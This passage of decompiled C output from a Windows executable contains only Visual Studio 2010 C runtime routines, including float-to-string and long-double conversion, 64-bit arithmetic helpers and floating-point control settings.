    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_0041793c:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Single Match
//  __fptostr
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  char *_Str;
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = 0;
    if (0 < _Digits) {
      iVar2 = _Digits;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      _Str = _Buf + 1;
      *_Buf = '0';
      pcVar3 = _Str;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Str);
        FID_conflict__memcpy(_Buf,_Str,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  FUN_0040c664();
  return eVar7;
}



// Library Function - Single Match
//  ___dtold
// 
// Library: Visual Studio 2010 Release

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  ushort uVar1;
  ushort uVar2;
  uint uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar1 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar2 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar4 = uVar1 & 0x7ff;
  uVar3 = *param_2;
  local_8 = 0x80000000;
  if ((uVar1 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar3 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_00417aa8;
    }
    uVar4 = uVar4 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar4 == 0x7ff) {
    uVar4 = 0x7fff;
  }
  else {
    uVar4 = uVar4 + 0x3c00;
  }
  local_8 = uVar3 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  uVar3 = uVar3 << 0xb;
  while( true ) {
    *param_1 = uVar3;
    param_1[1] = local_8;
    if ((local_8 & 0x80000000) != 0) break;
    local_8 = local_8 * 2 | *param_1 >> 0x1f;
    uVar3 = *param_1 * 2;
    uVar4 = uVar4 - 1;
  }
  uVar2 = uVar2 | uVar4;
LAB_00417aa8:
  *(ushort *)(param_1 + 2) = uVar2;
  return;
}



// Library Function - Single Match
//  __fltout2
// 
// Library: Visual Studio 2010 Release

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  char *pcVar1;
  int iVar2;
  errno_t eVar3;
  STRFLT p_Var4;
  uint local_34;
  uint uStack_30;
  ushort uStack_2c;
  char *local_28;
  short local_24;
  char local_22;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_28 = _ResultStr;
  ___dtold(&local_34,(uint *)&_Dbl);
  iVar2 = __I10_OUTPUT(local_34,uStack_30,uStack_2c,0x11,0,&local_24);
  pcVar1 = local_28;
  _Flt->flag = iVar2;
  _Flt->sign = (int)local_22;
  _Flt->decpt = (int)local_24;
  eVar3 = _strcpy_s(local_28,_SizeInBytes,local_20);
  if (eVar3 == 0) {
    _Flt->mantissa = pcVar1;
    p_Var4 = (STRFLT)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return p_Var4;
  }
                    // WARNING: Subroutine does not return
  __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2010 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2010 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    FUN_0040c664();
  }
  return eVar3;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00420044 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  *unaff_FS_OFFSET = (int)local_8;
  return;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2010 Release

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2010 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  ushort uVar1;
  undefined4 uVar2;
  byte bVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  INTRNCVT_STATUS IVar7;
  byte bVar8;
  uint *puVar9;
  uint *puVar10;
  uint uVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  int iVar16;
  bool bVar17;
  uint local_2c;
  uint local_24;
  uint local_14 [4];
  
  local_14[3] = DAT_00420044 ^ (uint)&stack0xfffffffc;
  uVar1 = *(ushort *)(_Ifp->ld12 + 10);
  uVar15 = *(uint *)(_Ifp->ld12 + 6);
  local_14[0] = uVar15;
  uVar2 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar12 = uVar1 & 0x7fff;
  iVar13 = uVar12 - 0x3fff;
  iVar5 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_14[1] = uVar2;
  local_14[2] = iVar5;
  bVar3 = (byte)DAT_0042154c;
  if (iVar13 == -0x3fff) {
    iVar14 = 0;
    iVar5 = 0;
    do {
      if (local_14[iVar5] != 0) {
        local_14[0] = 0;
        local_14[1] = 0;
        local_14[2] = 0;
        break;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 3);
  }
  else {
    bVar4 = false;
    iVar16 = DAT_00421548 + -1;
    iVar14 = (int)(DAT_00421548 + (DAT_00421548 >> 0x1f & 0x1fU)) >> 5;
    puVar10 = local_14 + iVar14;
    bVar8 = 0x1f - ((byte)DAT_00421548 & 0x1f);
    if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
      uVar11 = local_14[iVar14] & ~(-1 << (bVar8 & 0x1f));
      iVar6 = iVar14;
      while( true ) {
        if (uVar11 != 0) {
          iVar6 = (int)(iVar16 + (iVar16 >> 0x1f & 0x1fU)) >> 5;
          uVar11 = 1 << (0x1f - ((byte)iVar16 & 0x1f) & 0x1f);
          puVar9 = local_14 + iVar6;
          local_24 = *puVar9 + uVar11;
          if (local_24 < *puVar9) goto LAB_00417e2a;
          bVar17 = local_24 < uVar11;
          do {
            bVar4 = false;
            if (!bVar17) goto LAB_00417e31;
LAB_00417e2a:
            do {
              bVar4 = true;
LAB_00417e31:
              iVar6 = iVar6 + -1;
              *puVar9 = local_24;
              if ((iVar6 < 0) || (!bVar4)) goto LAB_00417e3f;
              puVar9 = local_14 + iVar6;
              local_24 = *puVar9 + 1;
            } while (local_24 < *puVar9);
            bVar17 = local_24 == 0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        uVar11 = local_14[iVar6];
      }
    }
LAB_00417e3f:
    *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
    iVar14 = iVar14 + 1;
    if (iVar14 < 3) {
      puVar10 = local_14 + iVar14;
      for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {
        *puVar10 = 0;
        puVar10 = puVar10 + 1;
      }
    }
    iVar14 = iVar13;
    if (bVar4) {
      iVar14 = uVar12 - 0x3ffe;
    }
    if (iVar14 < DAT_00421544 - DAT_00421548) {
      local_14[0] = 0;
      local_14[1] = 0;
      local_14[2] = 0;
    }
    else {
      if (DAT_00421544 < iVar14) {
        if (iVar14 < DAT_00421540) {
          iVar14 = iVar14 + DAT_00421554;
          local_14[0] = local_14[0] & 0x7fffffff;
          iVar5 = (int)(DAT_0042154c + (DAT_0042154c >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          iVar13 = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if (iVar13 < iVar5) {
              local_14[iVar13] = 0;
            }
            else {
              local_14[iVar13] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            iVar13 = iVar13 + -1;
          } while (-1 < iVar13);
        }
        else {
          local_14[1] = 0;
          local_14[2] = 0;
          local_14[0] = 0x80000000;
          iVar5 = (int)(DAT_0042154c + (DAT_0042154c >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          iVar13 = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if (iVar13 < iVar5) {
              local_14[iVar13] = 0;
            }
            else {
              local_14[iVar13] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            iVar13 = iVar13 + -1;
          } while (-1 < iVar13);
          iVar14 = DAT_00421554 + DAT_00421540;
        }
        goto LAB_004181ea;
      }
      iVar13 = DAT_00421544 - iVar13;
      local_14[0] = uVar15;
      local_14[1] = uVar2;
      iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = (byte)iVar13 & 0x1f;
      local_14[2] = iVar5;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar5 = 2;
      puVar10 = local_14 + (2 - iVar14);
      do {
        if (iVar5 < iVar14) {
          local_14[iVar5] = 0;
        }
        else {
          local_14[iVar5] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar5 = iVar5 + -1;
      } while (-1 < iVar5);
      iVar13 = DAT_00421548 + -1;
      iVar5 = (int)(DAT_00421548 + (DAT_00421548 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = 0x1f - ((byte)DAT_00421548 & 0x1f);
      puVar10 = local_14 + iVar5;
      if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
        uVar15 = local_14[iVar5] & ~(-1 << (bVar8 & 0x1f));
        iVar14 = iVar5;
        while (uVar15 == 0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_00417fde;
          uVar15 = local_14[iVar14];
        }
        iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
        bVar4 = false;
        uVar11 = 1 << (0x1f - ((byte)iVar13 & 0x1f) & 0x1f);
        uVar12 = local_14[iVar14];
        uVar15 = uVar12 + uVar11;
        if ((uVar15 < uVar12) || (uVar15 < uVar11)) {
          bVar4 = true;
        }
        local_14[iVar14] = uVar15;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar4))) {
          uVar12 = local_14[iVar14];
          uVar15 = uVar12 + 1;
          bVar4 = false;
          if ((uVar15 < uVar12) || (uVar15 == 0)) {
            bVar4 = true;
          }
          local_14[iVar14] = uVar15;
        }
      }
LAB_00417fde:
      *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
      iVar5 = iVar5 + 1;
      if (iVar5 < 3) {
        puVar10 = local_14 + iVar5;
        for (iVar13 = 3 - iVar5; iVar13 != 0; iVar13 = iVar13 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar5 = (int)(DAT_0042154c + 1 + (DAT_0042154c + 1 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = bVar3 + 1 & 0x1f;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar13 = 2;
      puVar10 = local_14 + (2 - iVar5);
      do {
        if (iVar13 < iVar5) {
          local_14[iVar13] = 0;
        }
        else {
          local_14[iVar13] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar13 = iVar13 + -1;
      } while (-1 < iVar13);
    }
    iVar14 = 0;
  }
LAB_004181ea:
  uVar15 = iVar14 << (0x1f - bVar3 & 0x1f) | -(uint)((uVar1 & 0x8000) != 0) & 0x80000000 |
           local_14[0];
  if (DAT_00421550 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar15;
    *(uint *)&_D->x = local_14[1];
  }
  else if (DAT_00421550 == 0x20) {
    *(uint *)&_D->x = uVar15;
  }
  IVar7 = ___security_check_cookie_4(local_14[3] ^ (uint)&stack0xfffffffc);
  return IVar7;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2010 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  ushort uVar1;
  undefined4 uVar2;
  byte bVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  INTRNCVT_STATUS IVar7;
  byte bVar8;
  uint *puVar9;
  uint *puVar10;
  uint uVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  int iVar16;
  bool bVar17;
  uint local_2c;
  uint local_24;
  uint local_14 [4];
  
  local_14[3] = DAT_00420044 ^ (uint)&stack0xfffffffc;
  uVar1 = *(ushort *)(_Ifp->ld12 + 10);
  uVar15 = *(uint *)(_Ifp->ld12 + 6);
  local_14[0] = uVar15;
  uVar2 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar12 = uVar1 & 0x7fff;
  iVar13 = uVar12 - 0x3fff;
  iVar5 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_14[1] = uVar2;
  local_14[2] = iVar5;
  bVar3 = (byte)DAT_00421564;
  if (iVar13 == -0x3fff) {
    iVar14 = 0;
    iVar5 = 0;
    do {
      if (local_14[iVar5] != 0) {
        local_14[0] = 0;
        local_14[1] = 0;
        local_14[2] = 0;
        break;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 3);
  }
  else {
    bVar4 = false;
    iVar16 = DAT_00421560 + -1;
    iVar14 = (int)(DAT_00421560 + (DAT_00421560 >> 0x1f & 0x1fU)) >> 5;
    puVar10 = local_14 + iVar14;
    bVar8 = 0x1f - ((byte)DAT_00421560 & 0x1f);
    if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
      uVar11 = local_14[iVar14] & ~(-1 << (bVar8 & 0x1f));
      iVar6 = iVar14;
      while( true ) {
        if (uVar11 != 0) {
          iVar6 = (int)(iVar16 + (iVar16 >> 0x1f & 0x1fU)) >> 5;
          uVar11 = 1 << (0x1f - ((byte)iVar16 & 0x1f) & 0x1f);
          puVar9 = local_14 + iVar6;
          local_24 = *puVar9 + uVar11;
          if (local_24 < *puVar9) goto LAB_0041837b;
          bVar17 = local_24 < uVar11;
          do {
            bVar4 = false;
            if (!bVar17) goto LAB_00418382;
LAB_0041837b:
            do {
              bVar4 = true;
LAB_00418382:
              iVar6 = iVar6 + -1;
              *puVar9 = local_24;
              if ((iVar6 < 0) || (!bVar4)) goto LAB_00418390;
              puVar9 = local_14 + iVar6;
              local_24 = *puVar9 + 1;
            } while (local_24 < *puVar9);
            bVar17 = local_24 == 0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        uVar11 = local_14[iVar6];
      }
    }
LAB_00418390:
    *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
    iVar14 = iVar14 + 1;
    if (iVar14 < 3) {
      puVar10 = local_14 + iVar14;
      for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {
        *puVar10 = 0;
        puVar10 = puVar10 + 1;
      }
    }
    iVar14 = iVar13;
    if (bVar4) {
      iVar14 = uVar12 - 0x3ffe;
    }
    if (iVar14 < DAT_0042155c - DAT_00421560) {
      local_14[0] = 0;
      local_14[1] = 0;
      local_14[2] = 0;
    }
    else {
      if (DAT_0042155c < iVar14) {
        if (iVar14 < DAT_00421558) {
          iVar14 = iVar14 + DAT_0042156c;
          local_14[0] = local_14[0] & 0x7fffffff;
          iVar5 = (int)(DAT_00421564 + (DAT_00421564 >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          iVar13 = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if (iVar13 < iVar5) {
              local_14[iVar13] = 0;
            }
            else {
              local_14[iVar13] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            iVar13 = iVar13 + -1;
          } while (-1 < iVar13);
        }
        else {
          local_14[1] = 0;
          local_14[2] = 0;
          local_14[0] = 0x80000000;
          iVar5 = (int)(DAT_00421564 + (DAT_00421564 >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          iVar13 = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if (iVar13 < iVar5) {
              local_14[iVar13] = 0;
            }
            else {
              local_14[iVar13] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            iVar13 = iVar13 + -1;
          } while (-1 < iVar13);
          iVar14 = DAT_0042156c + DAT_00421558;
        }
        goto LAB_0041873b;
      }
      iVar13 = DAT_0042155c - iVar13;
      local_14[0] = uVar15;
      local_14[1] = uVar2;
      iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = (byte)iVar13 & 0x1f;
      local_14[2] = iVar5;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar5 = 2;
      puVar10 = local_14 + (2 - iVar14);
      do {
        if (iVar5 < iVar14) {
          local_14[iVar5] = 0;
        }
        else {
          local_14[iVar5] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar5 = iVar5 + -1;
      } while (-1 < iVar5);
      iVar13 = DAT_00421560 + -1;
      iVar5 = (int)(DAT_00421560 + (DAT_00421560 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = 0x1f - ((byte)DAT_00421560 & 0x1f);
      puVar10 = local_14 + iVar5;
      if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
        uVar15 = local_14[iVar5] & ~(-1 << (bVar8 & 0x1f));
        iVar14 = iVar5;
        while (uVar15 == 0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_0041852f;
          uVar15 = local_14[iVar14];
        }
        iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
        bVar4 = false;
        uVar11 = 1 << (0x1f - ((byte)iVar13 & 0x1f) & 0x1f);
        uVar12 = local_14[iVar14];
        uVar15 = uVar12 + uVar11;
        if ((uVar15 < uVar12) || (uVar15 < uVar11)) {
          bVar4 = true;
        }
        local_14[iVar14] = uVar15;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar4))) {
          uVar12 = local_14[iVar14];
          uVar15 = uVar12 + 1;
          bVar4 = false;
          if ((uVar15 < uVar12) || (uVar15 == 0)) {
            bVar4 = true;
          }
          local_14[iVar14] = uVar15;
        }
      }
LAB_0041852f:
      *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
      iVar5 = iVar5 + 1;
      if (iVar5 < 3) {
        puVar10 = local_14 + iVar5;
        for (iVar13 = 3 - iVar5; iVar13 != 0; iVar13 = iVar13 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar5 = (int)(DAT_00421564 + 1 + (DAT_00421564 + 1 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = bVar3 + 1 & 0x1f;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar13 = 2;
      puVar10 = local_14 + (2 - iVar5);
      do {
        if (iVar13 < iVar5) {
          local_14[iVar13] = 0;
        }
        else {
          local_14[iVar13] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar13 = iVar13 + -1;
      } while (-1 < iVar13);
    }
    iVar14 = 0;
  }
LAB_0041873b:
  uVar15 = iVar14 << (0x1f - bVar3 & 0x1f) | -(uint)((uVar1 & 0x8000) != 0) & 0x80000000 |
           local_14[0];
  if (DAT_00421568 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar15;
    *(uint *)&_D->x = local_14[1];
  }
  else if (DAT_00421568 == 0x20) {
    *(uint *)&_D->x = uVar15;
  }
  IVar7 = ___security_check_cookie_4(local_14[3] ^ (uint)&stack0xfffffffc);
  return IVar7;
}



// WARNING: Removing unreachable block (ram,0x00418a2d)
// WARNING: Removing unreachable block (ram,0x004189f6)
// WARNING: Removing unreachable block (ram,0x00418ddd)
// WARNING: Removing unreachable block (ram,0x00418a05)
// WARNING: Removing unreachable block (ram,0x00418a0d)
// WARNING: Removing unreachable block (ram,0x00418a13)
// WARNING: Removing unreachable block (ram,0x00418a16)
// WARNING: Removing unreachable block (ram,0x00418a1d)
// WARNING: Removing unreachable block (ram,0x00418a27)
// WARNING: Removing unreachable block (ram,0x00418a82)
// WARNING: Removing unreachable block (ram,0x00418a7c)
// WARNING: Removing unreachable block (ram,0x00418a88)
// WARNING: Removing unreachable block (ram,0x00418aa5)
// WARNING: Removing unreachable block (ram,0x00418aa7)
// WARNING: Removing unreachable block (ram,0x00418aaf)
// WARNING: Removing unreachable block (ram,0x00418ab2)
// WARNING: Removing unreachable block (ram,0x00418ab7)
// WARNING: Removing unreachable block (ram,0x00418aba)
// WARNING: Removing unreachable block (ram,0x00418de6)
// WARNING: Removing unreachable block (ram,0x00418ac5)
// WARNING: Removing unreachable block (ram,0x00418dfd)
// WARNING: Removing unreachable block (ram,0x00418e04)
// WARNING: Removing unreachable block (ram,0x00418ad0)
// WARNING: Removing unreachable block (ram,0x00418ae3)
// WARNING: Removing unreachable block (ram,0x00418ae5)
// WARNING: Removing unreachable block (ram,0x00418af2)
// WARNING: Removing unreachable block (ram,0x00418af7)
// WARNING: Removing unreachable block (ram,0x00418afd)
// WARNING: Removing unreachable block (ram,0x00418b06)
// WARNING: Removing unreachable block (ram,0x00418b0d)
// WARNING: Removing unreachable block (ram,0x00418b25)
// WARNING: Removing unreachable block (ram,0x00418b35)
// WARNING: Removing unreachable block (ram,0x00418b43)
// WARNING: Removing unreachable block (ram,0x00418b83)
// WARNING: Removing unreachable block (ram,0x00418b8c)
// WARNING: Removing unreachable block (ram,0x00418da3)
// WARNING: Removing unreachable block (ram,0x00418b9a)
// WARNING: Removing unreachable block (ram,0x00418ba4)
// WARNING: Removing unreachable block (ram,0x00418dbe)
// WARNING: Removing unreachable block (ram,0x00418bb1)
// WARNING: Removing unreachable block (ram,0x00418bb8)
// WARNING: Removing unreachable block (ram,0x00418bc2)
// WARNING: Removing unreachable block (ram,0x00418bc7)
// WARNING: Removing unreachable block (ram,0x00418bd7)
// WARNING: Removing unreachable block (ram,0x00418bdc)
// WARNING: Removing unreachable block (ram,0x00418be6)
// WARNING: Removing unreachable block (ram,0x00418beb)
// WARNING: Removing unreachable block (ram,0x00418bfd)
// WARNING: Removing unreachable block (ram,0x00418c0a)
// WARNING: Removing unreachable block (ram,0x00418c19)
// WARNING: Removing unreachable block (ram,0x00418c26)
// WARNING: Removing unreachable block (ram,0x00418c43)
// WARNING: Removing unreachable block (ram,0x00418c47)
// WARNING: Removing unreachable block (ram,0x00418c4e)
// WARNING: Removing unreachable block (ram,0x00418c57)
// WARNING: Removing unreachable block (ram,0x00418c5a)
// WARNING: Removing unreachable block (ram,0x00418c6b)
// WARNING: Removing unreachable block (ram,0x00418c7a)
// WARNING: Removing unreachable block (ram,0x00418c85)
// WARNING: Removing unreachable block (ram,0x00418c8c)
// WARNING: Removing unreachable block (ram,0x00418cb7)
